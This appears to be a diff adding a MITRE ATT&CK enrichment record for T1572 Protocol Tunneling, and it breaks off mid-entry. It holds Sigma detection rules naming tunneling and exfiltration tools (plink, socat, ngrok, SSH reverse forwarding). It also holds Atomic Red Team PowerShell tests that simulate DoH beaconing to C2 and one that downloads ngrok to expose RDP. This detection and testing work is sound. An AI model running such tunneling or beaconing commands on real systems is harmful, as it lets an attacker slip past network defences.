@@ -1,0 +1,347 @@
+{
+    "id": "T1572",
+    "name": "Protocol Tunneling",
+    "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling)\n[Protocol Tunneling](T1572) may also be abused by adversaries during [Dynamic Resolution](T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19)\nAdversaries may also leverage [Protocol Tunneling](T1572) in conjunction with [Proxy](T1090) and/or [Protocol Impersonation](T1001.003) to further conceal C2 communications and infrastructure.",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Command and Control",
+    "data_sources": "Network Traffic: Network Traffic Flow, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",
+    "detection": "Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client.\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
+    "url": "https://attack.mitre.org/techniques/T1572",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "327f48c1-a6db-4eb8-875a-f6981f1b0183",
+                    "f38a82d2-fba3-4781-b549-525efbec8506",
+                    "c75309a3-59f8-4a8d-9c2c-4c927ad50555",
+                    "19bf6fdb-7721-4f3d-867f-53467f6a5db6",
+                    "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                    "5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4",
+                    "b1e5da3b-ca8e-4adf-915c-9921f3d85481",
+                    "4fe28b27-b13c-453e-a386-c2ef362a573b",
+                    "ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31",
+                    "f7d7ebd5-a016-46e2-9c54-f9932f2d386d",
+                    "f38ce0b9-5e97-4b47-a211-7dc8d8b871da",
+                    "1d08ac94-400d-4469-a82f-daee9a908849",
+                    "3ceb2083-a27f-449a-be33-14ec1b7cc973",
+                    "48a61b29-389f-4032-b317-b30de6b95314"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "327f48c1-a6db-4eb8-875a-f6981f1b0183",
+                        "lookup_data": {
+                            "description": "Detects suspicious SSH tunnel port forwarding to a local port",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/12\ndescription: Detects suspicious SSH tunnel port forwarding to a local port\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: ' -R '\n    Image|endswith: \\ssh.exe\nfalsepositives:\n- Administrative activity using a remote port forwarding to a local port\nid: 327f48c1-a6db-4eb8-875a-f6981f1b0183\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/25\nreferences:\n- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1572\n- attack.lateral_movement\n- attack.t1021.001\ntitle: Port Forwarding Attempt Via SSH\n",
+                            "sigma:id": "327f48c1-a6db-4eb8-875a-f6981f1b0183",
+                            "title": "Port Forwarding Attempt Via SSH",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f38a82d2-fba3-4781-b549-525efbec8506",
+                        "lookup_data": {
+                            "description": "Detects the use of 3proxy, a tiny free proxy server",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/09/13\ndescription: Detects the use of 3proxy, a tiny free proxy server\ndetection:\n  condition: 1 of selection_*\n  selection_img:\n    Image|endswith: \\3proxy.exe\n  selection_params:\n    CommandLine|contains: .exe -i127.0.0.1 -p\n  selection_pe:\n    Description: 3proxy - tiny proxy server\nfalsepositives:\n- Administrative activity\nid: f38a82d2-fba3-4781-b549-525efbec8506\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://github.com/3proxy/3proxy\n- https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1572\ntitle: 3Proxy Usage\n",
+                            "sigma:id": "f38a82d2-fba3-4781-b549-525efbec8506",
+                            "title": "3Proxy Usage",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c75309a3-59f8-4a8d-9c2c-4c927ad50555",
+                        "lookup_data": {
+                            "description": "Execution of well known tools for data exfiltration and tunneling",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Execution of well known tools for data exfiltration and tunneling\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\plink.exe\n    - \\socat.exe\n    - \\stunnel.exe\n    - \\httptunnel.exe\nfalsepositives:\n- Legitimate Administrator using tools\nid: c75309a3-59f8-4a8d-9c2c-4c927ad50555\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.command_and_control\n- attack.t1041\n- attack.t1572\n- attack.t1071.001\ntitle: Exfiltration and Tunneling Tools Execution\n",
+                            "sigma:id": "c75309a3-59f8-4a8d-9c2c-4c927ad50555",
+                            "title": "Exfiltration and Tunneling Tools Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "19bf6fdb-7721-4f3d-867f-53467f6a5db6",
+                        "lookup_data": {
+                            "description": "Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/11/03\ndescription: Detects an executable accessing an ngrok tunneling endpoint, which could\n  be a sign of forbidden exfiltration of data exfiltration by malicious actors\ndetection:\n  condition: selection\n  selection:\n    DestinationHostname|contains:\n    - tunnel.us.ngrok.com\n    - tunnel.eu.ngrok.com\n    - tunnel.ap.ngrok.com\n    - tunnel.au.ngrok.com\n    - tunnel.sa.ngrok.com\n    - tunnel.jp.ngrok.com\n    - tunnel.in.ngrok.com\nfalsepositives:\n- Legitimate use of ngrok\nid: 19bf6fdb-7721-4f3d-867f-53467f6a5db6\nlevel: high\nlogsource:\n  category: network_connection\n  product: linux\nreferences:\n- https://twitter.com/hakluke/status/1587733971814977537/photo/1\n- https://ngrok.com/docs/secure-tunnels/tunnels/ssh-reverse-tunnel-agent\nstatus: experimental\ntags:\n- attack.exfiltration\n- attack.command_and_control\n- attack.t1567\n- attack.t1568.002\n- attack.t1572\n- attack.t1090\n- attack.t1102\n- attack.s0508\ntitle: Communication To Ngrok Tunneling Service - Linux\n",
+                            "sigma:id": "19bf6fdb-7721-4f3d-867f-53467f6a5db6",
+                            "title": "Communication To Ngrok Tunneling Service - Linux",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                        "lookup_data": {
+                            "description": "UNC3524: Eye Spy on Your Email",
+                            "link": "http://www.botvrij.eu/data/feed-osint/25adc94b-5b29-44fe-a4a8-c89d17ff3566.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1652459344",
+                            "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4",
+                        "lookup_data": {
+                            "description": "Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389",
+                            "raw": "author: Samir Bousseaden\ndate: 2019/02/16\ndescription: Detects svchost hosting RDP termsvcs communicating with the loopback\n  address and on TCP port 3389\ndetection:\n  condition: selection and selection2\n  selection:\n    Image|endswith: \\svchost.exe\n    Initiated: 'true'\n    SourcePort: 3389\n  selection2:\n  - DestinationIp|startswith: '127.'\n  - DestinationIp: ::1\nfalsepositives:\n- Unknown\nid: 5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/SBousseaden/status/1096148422984384514\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1572\n- attack.lateral_movement\n- attack.t1021.001\n- car.2013-07-002\ntitle: RDP Over Reverse SSH Tunnel\n",
+                            "sigma:id": "5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4",
+                            "title": "RDP Over Reverse SSH Tunnel",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b1e5da3b-ca8e-4adf-915c-9921f3d85481",
+                        "lookup_data": {
+                            "description": "Detects svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/29\ndescription: Detects svchost hosting RDP termsvcs communicating to target systems\n  on TCP port 80 or 443\ndetection:\n  condition: selection\n  selection:\n    DestinationPort:\n    - 80\n    - 443\n    Image|endswith: \\svchost.exe\n    Initiated: 'true'\n    SourcePort: 3389\nfalsepositives:\n- Unknown\nid: b1e5da3b-ca8e-4adf-915c-9921f3d85481\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://twitter.com/tekdefense/status/1519711183162556416?s=12&t=OTsHCBkQOTNs1k3USz65Zg\n- https://www.mandiant.com/resources/bypassing-network-restrictions-through-rdp-tunneling\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1572\n- attack.lateral_movement\n- attack.t1021.001\n- car.2013-07-002\ntitle: RDP to HTTP or HTTPS Target Ports\n",
+                            "sigma:id": "b1e5da3b-ca8e-4adf-915c-9921f3d85481",
+                            "title": "RDP to HTTP or HTTPS Target Ports",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4fe28b27-b13c-453e-a386-c2ef362a573b",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1572",
+                            "mitre-cti:description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ",
+                            "mitre-cti:name": "Protocol Tunneling",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b', 'type': 'attack-pattern', 'created': '2020-03-15T16:03:39.082Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1572', 'url': 'https://attack.mitre.org/techniques/T1572'}, {'source_name': 'SSH Tunneling', 'url': 'https://www.ssh.com/ssh/tunneling', 'description': 'SSH.COM. (n.d.). SSH tunnel. Retrieved March 15, 2020.'}, {'source_name': 'BleepingComp Godlua JUL19', 'url': 'https://www.bleepingcomputer.com/news/security/new-godlua-malware-evades-traffic-monitoring-via-dns-over-https/', 'description': 'Gatlan, S. (2019, July 3). New Godlua Malware Evades Traffic Monitoring via DNS over HTTPS. Retrieved March 15, 2020.'}, {'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'source_name': 'University of Birmingham C2'}], 'modified': '2020-03-27T17:15:35.372Z', 'name': 'Protocol Tunneling', 'description': 'Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \\n\\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \\n\\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \\n\\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}], 'x_mitre_detection': 'Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)', 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Connection Creation', 'Network Traffic: Network Traffic Flow', 'Network Traffic: Network Traffic Content'], 'x_mitre_is_subtechnique': False}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31",
+                        "lookup_data": {
+                            "description": "Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\nInvolved domains are bin.equinox.io for download and *.ngrok.io for connections.\n",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/05/14\ndescription: 'Detects the use of Ngrok, a utility used for port forwarding and tunneling,\n  often used by threat actors to make local protected services publicly available.\n\n  Involved domains are bin.equinox.io for download and *.ngrok.io for connections.\n\n  '\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains:\n    - ' tcp 139'\n    - ' tcp 445'\n    - ' tcp 3389'\n    - ' tcp 5985'\n    - ' tcp 5986'\n  selection2:\n    CommandLine|contains|all:\n    - ' start '\n    - --all\n    - --config\n    - .yml\n  selection3:\n    CommandLine|contains:\n    - ' tcp '\n    - ' http '\n    - ' authtoken '\n    Image|endswith: ngrok.exe\n  selection4:\n    CommandLine|contains:\n    - '.exe authtoken '\n    - .exe start --all\nfalsepositives:\n- Another tool that uses the command line switches of Ngrok\n- Ngrok http 3978 (https://docs.microsoft.com/en-us/azure/bot-service/bot-service-debug-channel-ngrok?view=azure-bot-service-4.0)\nid: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://ngrok.com/docs\n- https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html\n- https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp\n- https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection\n- https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/\n- https://twitter.com/xorJosh/status/1598646907802451969\n- https://www.softwaretestinghelp.com/how-to-use-ngrok/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1572\ntitle: Ngrok Usage\n",
+                            "sigma:id": "ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31",
+                            "title": "Ngrok Usage",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f7d7ebd5-a016-46e2-9c54-f9932f2d386d",
+                        "lookup_data": {
+                            "description": "Execution of ssh.exe to perform data exfiltration and tunneling through RDP",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/12\ndescription: Execution of ssh.exe to perform data exfiltration and tunneling through\n  RDP\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: :3389\n    Image|endswith: \\ssh.exe\nfalsepositives:\n- Administrative activity\nid: f7d7ebd5-a016-46e2-9c54-f9932f2d386d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/25\nreferences:\n- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nrelated:\n- id: f38ce0b9-5e97-4b47-a211-7dc8d8b871da\n  type: similar\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1572\ntitle: Potential RDP Tunneling Via SSH\n",
+                            "sigma:id": "f7d7ebd5-a016-46e2-9c54-f9932f2d386d",
+                            "title": "Potential RDP Tunneling Via SSH",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f38ce0b9-5e97-4b47-a211-7dc8d8b871da",
+                        "lookup_data": {
+                            "description": "Execution of plink to perform data exfiltration and tunneling",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/04\ndescription: Execution of plink to perform data exfiltration and tunneling\ndetection:\n  condition: selection_a or all of selection_b*\n  selection_a:\n    CommandLine|contains: :127.0.0.1:3389\n    Image|endswith: \\plink.exe\n  selection_b1:\n    CommandLine|contains: :3389\n    Image|endswith: \\plink.exe\n  selection_b2:\n    CommandLine|contains:\n    - ' -P 443'\n    - ' -P 22'\nfalsepositives:\n- Administrative activity\nid: f38ce0b9-5e97-4b47-a211-7dc8d8b871da\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/27\nreferences:\n- https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nrelated:\n- id: f7d7ebd5-a016-46e2-9c54-f9932f2d386d\n  type: similar\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1572\ntitle: Potential RDP Tunneling Via SSH Plink\n",
+                            "sigma:id": "f38ce0b9-5e97-4b47-a211-7dc8d8b871da",
+                            "title": "Potential RDP Tunneling Via SSH Plink",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1d08ac94-400d-4469-a82f-daee9a908849",
+                        "lookup_data": {
+                            "description": "Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/11/03\ndescription: Detects an executable accessing an ngrok tunneling endpoint, which could\n  be a sign of forbidden exfiltration of data exfiltration by malicious actors\ndetection:\n  condition: selection\n  selection:\n    DestinationHostname|contains:\n    - tunnel.us.ngrok.com\n    - tunnel.eu.ngrok.com\n    - tunnel.ap.ngrok.com\n    - tunnel.au.ngrok.com\n    - tunnel.sa.ngrok.com\n    - tunnel.jp.ngrok.com\n    - tunnel.in.ngrok.com\nfalsepositives:\n- Legitimate use of ngrok\nid: 1d08ac94-400d-4469-a82f-daee9a908849\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nreferences:\n- https://twitter.com/hakluke/status/1587733971814977537/photo/1\n- https://ngrok.com/docs/secure-tunnels/tunnels/ssh-reverse-tunnel-agent\nstatus: experimental\ntags:\n- attack.exfiltration\n- attack.command_and_control\n- attack.t1567\n- attack.t1568.002\n- attack.t1572\n- attack.t1090\n- attack.t1102\n- attack.s0508\ntitle: Communication To Ngrok Tunneling Service\n",
+                            "sigma:id": "1d08ac94-400d-4469-a82f-daee9a908849",
+                            "title": "Communication To Ngrok Tunneling Service",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3ceb2083-a27f-449a-be33-14ec1b7cc973",
+                        "lookup_data": {
+                            "description": "Detects Silence EmpireDNSAgent as described in the Group-IP report",
+                            "raw": "author: Alina Stepchenkova, Group-IB, oscd.community\ndate: 2019/11/01\ndescription: Detects Silence EmpireDNSAgent as described in the Group-IP report\ndetection:\n  condition: empire and dnscat\n  dnscat:\n    ScriptBlockText|contains|all:\n    - set type=$LookupType`nserver\n    - $Command | nslookup 2>&1 | Out-String\n    - New-RandomDNSField\n    - '[Convert]::ToString($SYNOptions, 16)'\n    - $Session.Dead = $True\n    - $Session[\"Driver\"] -eq\n  empire:\n    ScriptBlockText|contains|all:\n    - System.Diagnostics.Process\n    - Stop-Computer\n    - Restart-Computer\n    - Exception in execution\n    - $cmdargs\n    - Close-Dnscat2Tunnel\nfalsepositives:\n- Unknown\nid: 3ceb2083-a27f-449a-be33-14ec1b7cc973\nlevel: critical\nlogsource:\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\n  service: powershell\nmodified: 2022/10/05\nreferences:\n- https://www.group-ib.com/resources/threat-research/silence_2.0.going_global.pdf\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1071.004\n- attack.t1572\n- attack.impact\n- attack.t1529\n- attack.g0091\n- attack.s0363\ntitle: Silence.EDA Detection\n",
+                            "sigma:id": "3ceb2083-a27f-449a-be33-14ec1b7cc973",
+                            "title": "Silence.EDA Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "48a61b29-389f-4032-b317-b30de6b95314",
+                        "lookup_data": {
+                            "description": "Detects suspicious Plink tunnel port forwarding to a local port",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/01/19\ndescription: Detects suspicious Plink tunnel port forwarding to a local port\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: ' -R '\n    Description: Command-line SSH, Telnet, and Rlogin client\nfalsepositives:\n- Administrative activity using a remote port forwarding to a local port\nid: 48a61b29-389f-4032-b317-b30de6b95314\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.real-sec.com/2019/04/bypassing-network-restrictions-through-rdp-tunneling/\n- https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1572\n- attack.lateral_movement\n- attack.t1021.001\ntitle: Suspicious Plink Port Forwarding\n",
+                            "sigma:id": "48a61b29-389f-4032-b317-b30de6b95314",
+                            "title": "Suspicious Plink Port Forwarding",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1572",
+                "display_name": "Protocol Tunneling",
+                "atomic_tests": [
+                    {
+                        "name": "DNS over HTTPS Large Query Volume",
+                        "auto_generated_guid": "ae9ef4b0-d8c1-49d4-8758-06206f19af0a",
+                        "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "doh_server": {
+                                "description": "Default DoH resolver",
+                                "type": "string",
+                                "default": "https://8.8.8.8/resolve"
+                            },
+                            "query_type": {
+                                "description": "DNS query type",
+                                "type": "string",
+                                "default": "TXT"
+                            },
+                            "subdomain": {
+                                "description": "Subdomain prepended to the domain name",
+                                "type": "string",
+                                "default": "atomicredteam"
+                            },
+                            "query_volume": {
+                                "description": "Number of DNS queries to send",
+                                "type": "integer",
+                                "default": 1000
+                            },
+                            "domain": {
+                                "description": "Default domain to simulate against",
+                                "type": "string",
+                                "default": "127.0.0.1.xip.io"
+                            }
+                        },
+                        "executor": {
+                            "command": "for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest \"#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}\" -UseBasicParsing).Content }\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "DNS over HTTPS Regular Beaconing",
+                        "auto_generated_guid": "0c5f9705-c575-42a6-9609-cbbff4b2fc9b",
+                        "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "doh_server": {
+                                "description": "Default DoH resolver",
+                                "type": "string",
+                                "default": "https://8.8.8.8/resolve"
+                            },
+                            "runtime": {
+                                "description": "Time in minutes to run the simulation",
+                                "type": "integer",
+                                "default": 30
+                            },
+                            "domain": {
+                                "description": "Default domain to simulate against",
+                                "type": "string",
+                                "default": "127.0.0.1.xip.io"
+                            },
+                            "subdomain": {
+                                "description": "Subdomain prepended to the domain name",
+                                "type": "string",
+                                "default": "atomicredteam"
+                            },
+                            "query_type": {
+                                "description": "DNS query type",
+                                "type": "string",
+                                "default": "TXT"
+                            },
+                            "c2_interval": {
+                                "description": "Seconds between C2 requests to the command and control server",
+                                "type": "integer",
+                                "default": 30
+                            },
+                            "c2_jitter": {
+                                "description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests",
+                                "type": "integer",
+                                "default": 20
+                            }
+                        },
+                        "executor": {
+                            "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "DNS over HTTPS Long Domain Query",
+                        "auto_generated_guid": "748a73d5-cea4-4f34-84d8-839da5baa99c",
+                        "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "doh_server": {
+                                "description": "Default DoH resolver",
+                                "type": "string",
+                                "default": "https://8.8.8.8/resolve"
+                            },
+                            "query_type": {
+                                "description": "DNS query type",
+                                "type": "string",
+                                "default": "TXT"
+                            },
+                            "subdomain": {
+                                "description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)",
+                                "type": "string",
+                                "default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte"
+                            },
+                            "domain": {
+                                "description": "Default domain to simulate against",
+                                "type": "string",
+                                "default": "127.0.0.1.xip.io"
+                            }
+                        },
+                        "executor": {
+                            "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "run ngrok",
+                        "auto_generated_guid": "4cdc9fc7-53fb-4894-9f0c-64836943ea60",
+                        "description": "Download and run ngrok. Create tunnel to chosen port.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "api_token": {
+                                "description": "ngrok API",
+                                "type": "string",
+                                "default": "N/A"
+                            },
+                            "port_num": {
+                                "description": "port number for tunnel",
+                                "type": "integer",
+                                "default": 3389
+                            },
+                            "download": {
+                                "description": "link to download ngrok",
+                                "type": "string",
+                                "default": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Download ngrok\n",
+                                "prereq_command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
